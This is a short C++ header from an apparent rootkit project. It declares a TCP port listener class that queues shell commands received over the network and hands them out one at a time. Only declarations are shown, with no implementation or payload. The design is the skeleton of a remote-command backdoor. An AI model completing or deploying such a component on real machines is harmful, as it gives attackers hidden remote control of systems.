//
// Created by idan on 12/31/23.
//

#ifndef ROOTKIT_SHELL_COMMAND_TCP_PORT_LISTENER_H
#define ROOTKIT_SHELL_COMMAND_TCP_PORT_LISTENER_H

#include <queue>
#include "../../network_access/tcp/basic_tcp_port_listener.h"

class shell_command_tcp_port_listener : public basic_tcp_port_listener {
protected:
    std::queue<std::string> commands_queue;

public:
    void listen() override;

    std::string pop_next_command();

};


#endif //ROOTKIT_SHELL_COMMAND_TCP_PORT_LISTENER_H
